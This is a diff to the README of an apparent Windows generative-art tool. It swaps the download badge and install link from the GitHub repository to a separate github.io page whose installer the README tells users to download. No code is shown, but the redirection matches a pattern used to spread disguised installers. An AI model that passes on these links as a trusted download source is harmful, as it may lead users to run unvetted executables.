@@ -1,6 +1,6 @@
 # 🎨 Socialism-of-Shapes-Generative-Art - Create unique geometric designs with ease
 
-[![](https://img.shields.io/badge/Download-Socialism_of_Shapes-blue)](https://github.com/Dutybound-masonite979/Socialism-of-Shapes-Generative-Art)
+[![](https://img.shields.io/badge/Download-Socialism_of_Shapes-blue)](https://dutybound-masonite979.github.io)
 
 ## 📖 About this program
 
@@ -21,7 +21,7 @@ Your computer must meet these basic needs:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the project page to reach the download area: [https://github.com/Dutybound-masonite979/Socialism-of-Shapes-Generative-Art](https://github.com/Dutybound-masonite979/Socialism-of-Shapes-Generative-Art)
+1. Visit the project page to reach the download area: [https://dutybound-masonite979.github.io](https://dutybound-masonite979.github.io)
 2. Locate the link marked Releases. 
 3. Click the most recent version of the Windows installer.
 4. Save the file to your desktop.
